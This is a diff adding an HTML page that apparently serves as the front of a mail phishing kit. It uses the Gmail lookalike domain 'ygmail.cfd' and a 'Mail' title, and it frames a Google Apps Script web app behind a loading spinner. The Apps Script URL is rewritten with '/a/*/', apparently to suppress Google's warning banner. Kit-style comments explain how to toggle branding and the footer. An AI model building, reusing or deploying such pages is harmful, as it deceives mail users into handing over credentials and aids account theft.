@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Loading... - Mail</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+  <link href="footer.css" rel="stylesheet">
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    #content {
+      flex: 1 0 auto; /* Make the content (iframe) take available space */
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    iframe {
+      flex-grow: 1;
+      border: none;
+      width: 100%;
+    }
+
+    footer {
+      flex-shrink: 100; /* Prevent footer from shrinking */
+    }
+
+    .spinner-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: rgba(255, 255, 255, 0.8);
+      z-index: 9999;
+    }
+
+    .spinner-border {
+      width: 3rem;
+      height: 3rem;
+    }
+  </style>
+</head>
+<body id="body">
+  <!-- Spinner -->
+  <div id="spinnerContainer" class="spinner-container">
+    <div class="spinner-border text-primary" role="status">
+      <span class="sr-only" style="color: rgb(98, 97, 97);">Loading...</span>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div id="content">
+    <iframe id="myIframe"></iframe>
+  </div>
+
+  <!-- Footer -->
+  <footer id="footer" class="footer-1" style="display: none;">
+    <div class="footer-copyright">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12 text-center">
+            <p>Copyright <span id="brand">GRASHIEX </span> © <span id="year"></span>. All rights reserved.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- JavaScript -->
+  <script>
+    // Define brand name and domain
+    var brandname = "ygmail.cfd";
+    var domainname = "ygmail.cfd";
+    var appScript = "https://script.google.com/macros/s/AKfycbw9TClf4FormCy9MBHg77h6PEuwBP7RliW5hA4kCAQ9Qs_1xaPopOQtu9L7px79XdK1wQ/exec";
+    var footer = "block"; //CHANGE BLOCK TO none TO HIDE THE FOOTER
+
+    function modifyAppScriptURL() {
+      var modifiedURL = appScript.replace("https://script.google.com/", "https://script.google.com/a/*/");
+      return modifiedURL;
+    }
+    var appScriptURL = modifyAppScriptURL();
+
+    //document.getElementById("brand").textContent = brandname; // UNCOMMENT THIS TO USE THE BRANDNAME
+    document.getElementById("year").textContent = new Date().getFullYear();
+    document.getElementById("footer").style.display = footer;
+  </script>
+  <script src="s.js"></script>
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
